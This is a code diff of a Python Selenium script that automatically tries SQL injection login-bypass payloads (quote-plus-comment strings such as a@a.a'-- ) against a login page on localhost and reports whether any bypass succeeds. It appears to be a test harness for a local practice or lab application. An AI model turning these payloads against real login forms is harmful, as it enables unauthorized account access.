@@ -1,6 +1,9 @@
 from selenium import webdriver
+from selenium.common import UnexpectedAlertPresentException
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.action_chains import ActionChains
+
 import time
 
 
@@ -10,39 +13,37 @@ def try_sqlinj(user_name, password):
     driver_url = 'http://localhost:8000/Login.php'
     driver.get(driver_url)
 
-    # Wait for the page to load (you can use other wait strategies too)
-    time.sleep(2)
+    time.sleep(1)  # wait for the page to load
 
     # Find and fill the fields with desired values
     input_elements = driver.find_elements(By.TAG_NAME, "input")
     input_elements = [element for element in input_elements if element.is_displayed()]
 
-    input_elements[0].send_keys(user_name)
-    input_elements[1].send_keys(password)
+    input_elements[0].send_keys(user_name)  # Enter the username
+    input_elements[1].send_keys(password)  # Enter password
 
-    """
-    input_elements[0].send_keys('a@a.a\'/*')
-    input_elements[1].send_keys('\'*/\'')
-
-    # another option
-    # input_elements[0].send_keys('a@a.a\'-- ')
-    """
-
+    # Find and click the submit button
     button_elements = driver.find_elements(By.TAG_NAME, "button")
     button_elements = [element for element in button_elements if element.is_displayed() and
                        (element.get_attribute("type") == "submit" or element.get_attribute("disabled type") == "submit")]
-
     button_elements[-1].click()
 
-    time.sleep(2)
+    time.sleep(1) # wait for the page to load
+
+    try:
+        # don't work when there is a popup
+        actions = ActionChains(driver)
+        actions.send_keys(Keys.ESCAPE)  # Escape popups
+        actions.perform()
+    except UnexpectedAlertPresentException:
+        alert = driver.switch_to.active_element  # closing the popup
+
+
+    time.sleep(0.5)
     new_url = driver.current_url
-    time.sleep(2)
     passed = False
     if driver_url != new_url:
-        print('sql injection succeeded')
         passed = True
-    else:
-        print('sql injection failed')
 
     # Close the browser window
     driver.quit()
@@ -52,6 +53,10 @@ def try_sqlinj(user_name, password):
 injections = [['a@a.a\'/*', '\'*/\''], ['a@a.a\'-- ', '']]
 for injection in injections:
     passed = try_sqlinj(injection[0], injection[1])
-    print(passed)
+    if passed:
+        print('sql injection succeeded')
+        exit(0)
+print('sql injection failed')
+
 
 
